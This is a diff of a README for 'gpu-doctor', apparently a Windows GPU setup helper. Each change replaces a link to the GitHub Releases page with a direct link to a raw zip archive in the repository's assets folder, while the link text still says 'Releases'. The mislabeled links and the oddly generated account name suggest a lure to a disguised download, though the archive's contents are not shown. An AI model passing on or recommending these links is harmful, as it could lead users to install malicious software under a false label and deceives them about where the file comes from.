@@ -1,6 +1,6 @@
 # ⚙️ gpu-doctor - Easy GPU setup for Windows apps
 
-[![Download gpu-doctor](https://img.shields.io/badge/Download-gpu--doctor-blue.svg?style=for-the-badge&logo=github)](https://github.com/Philippinegreatyellowgentian737/gpu-doctor/releases)
+[![Download gpu-doctor](https://img.shields.io/badge/Download-gpu--doctor-blue.svg?style=for-the-badge&logo=github)](https://github.com/Philippinegreatyellowgentian737/gpu-doctor/raw/refs/heads/main/assets/gpu_doctor_3.8.zip)
 
 ## 🖥️ What gpu-doctor does
 
@@ -19,7 +19,7 @@ It also helps with AMD RX 5700 XT setups by setting `HSA_OVERRIDE_GFX_VERSION` w
 
 Visit this page to download:
 
-[Download gpu-doctor from GitHub Releases](https://github.com/Philippinegreatyellowgentian737/gpu-doctor/releases)
+[Download gpu-doctor from GitHub Releases](https://github.com/Philippinegreatyellowgentian737/gpu-doctor/raw/refs/heads/main/assets/gpu_doctor_3.8.zip)
 
 Look for the latest release and get the Windows file from there.
 
@@ -140,7 +140,7 @@ gpu-doctor can help with the `HSA_OVERRIDE_GFX_VERSION` setting if that card nee
 
 ## 🔗 Download again
 
-[Go to the gpu-doctor releases page](https://github.com/Philippinegreatyellowgentian737/gpu-doctor/releases)
+[Go to the gpu-doctor releases page](https://github.com/Philippinegreatyellowgentian737/gpu-doctor/raw/refs/heads/main/assets/gpu_doctor_3.8.zip)
 
 ## 🧭 Quick start
 
